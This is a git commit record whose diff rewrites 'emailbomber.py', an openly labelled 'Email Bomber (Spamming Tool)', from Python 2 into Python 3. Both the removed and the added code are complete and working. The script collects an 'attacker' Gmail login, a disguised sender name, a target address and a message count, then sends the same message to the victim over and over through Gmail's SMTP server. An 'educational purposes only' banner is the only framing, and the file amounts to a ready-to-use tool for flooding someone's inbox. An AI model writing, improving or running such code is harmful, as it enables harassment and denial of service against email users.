5e00523fda754b5beecb198cbd2ff8b089bf2c02
alan61503 <alanchrisdisilva@gmail.com>
2025-07-03 18:06:26 +0530

    .

--- emailbomber.py
+++ emailbomber.py
@@ -1,9 +1,7 @@
-#!/usr/bin/python 2.7
-#E-bomber
-#This code for education purpose only.
-#Use it at your own risk !!!
 
 
+# Email Bomber (Spamming Tool) - Python 3 Version
+# This code is for educational purposes only. Use at your own risk!
 
 import os
 import smtplib
@@ -11,68 +9,62 @@ import getpass
 import sys
 import time
 
-print '                                                                    '
-print '                                                                    '
-print '            #################################################       '
-print '            #                                               #       '
-print '            #        Email Bomber ( Spamming Tool )         #       '
-print '            #                                               #       '
-print '            #                  Version 2.0                  #       '
-print '            #                                               #       '
-print '            #           Modified by : Mohin Paramasivam     #       '
-print '            #                                               #       '
-print '            #       Only for Educational Purposes !!        #       '
-print '            #                                               #       '
-print '            #################################################       '
+def main():
+    print("""
+            #################################################
+            #                                               #
+            #        Email Bomber ( Spamming Tool )         #
+            #                                               #
+            #                  Version 2.0                  #
+            #                                               #
+            #           Modified by : Mohin Paramasivam     #
+            #                                               #
+            #       Only for Educational Purposes !!        #
+            #                                               #
+            #################################################
+    """)
 
-print '                                                                   '
+    email = input('Attacker Gmail Address : ')
+    user = input('Anonymous name : ')
+    passwd = getpass.getpass('Password: ')
+    to = input('\nTo: ')
+    body = input('Message: ')
+    while True:
+        try:
+            total = int(input('Number of send: '))
+            if total < 1:
+                print('Please enter a positive integer.')
+                continue
+            break
+        except ValueError:
+            print('Please enter a valid number.')
 
+    smtp_server = 'smtp.gmail.com'
+    port = 587
 
-print '                                           '
+    try:
+        server = smtplib.SMTP(smtp_server, port)
+        server.ehlo()
+        server.starttls()
+        server.login(email, passwd)
+        for i in range(1, total + 1):
+            subject = f"Message {i} from {user}"
+            msg = f"From: {user}\nTo: {to}\nSubject: {subject}\n\n{body}"
+            server.sendmail(email, to, msg)
+            print(f"\rE-mails sent: {i}", end='')
+            time.sleep(1)
+            sys.stdout.flush()
+        server.quit()
+        print('\nDone !!!')
+    except KeyboardInterrupt:
+        print('[-] Canceled')
+        sys.exit()
+    except smtplib.SMTPAuthenticationError:
+        print('\n[!] The username or password you entered is incorrect.')
+        sys.exit()
+    except Exception as e:
+        print(f'\n[!] An error occurred: {e}')
+        sys.exit()
 
-print '    '
-email = raw_input('Attacker Gmail Address : ')
-print '             '
-user = raw_input('Anonymous name : ')
-print '      '
-passwd = getpass.getpass('Password: ')
-
-print '   '
-
-to = raw_input('\nTo: ')
-
-
-print '    '
-
-body = raw_input('Message: ')
-
-print '    '
-
-total = input('Number of send: ')
-
-smtp_server = 'smtp.gmail.com'
-port = 587
-
-
-print ''
-
-try:
-    server = smtplib.SMTP(smtp_server,port)
-    server.ehlo()
-    server.starttls()
-    server.login(email,passwd)
-    for i in range(1, total+1):
-        subject = os.urandom(9)
-        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
-        server.sendmail(email,to,msg)
-        print "\rE-mails sent: %i" % i
-        time.sleep(1)
-        sys.stdout.flush()
-    server.quit()
-    print '\n Done !!!'
-except KeyboardInterrupt:
-    print '[-] Canceled'
-    sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print '\n[!] The username or password you entered is incorrect.'
-    sys.exit()
+if __name__ == "__main__":
+    main()
